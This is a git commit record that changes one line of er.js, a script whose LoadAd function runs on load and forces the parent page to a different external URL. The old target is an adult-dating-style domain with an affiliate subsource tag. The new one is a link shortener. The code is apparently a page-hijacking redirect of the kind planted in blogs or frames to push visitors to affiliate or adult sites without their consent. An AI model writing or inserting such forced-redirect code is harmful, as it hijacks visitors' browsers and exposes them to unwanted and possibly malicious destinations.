d3e26dd984b17c289c0269e4fc38fa2d30586231
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2023-01-12 16:04:25 +0700

    Update er.js

--- er.js
+++ er.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://bgbiffg.bustydatng.com/s/63a9c8ce813d6?subsource=Enka"; } LoadAd();
+function LoadAd() { parent.location.href="https://rbqoh.app.link/LDhQi80rmwb"; } LoadAd();
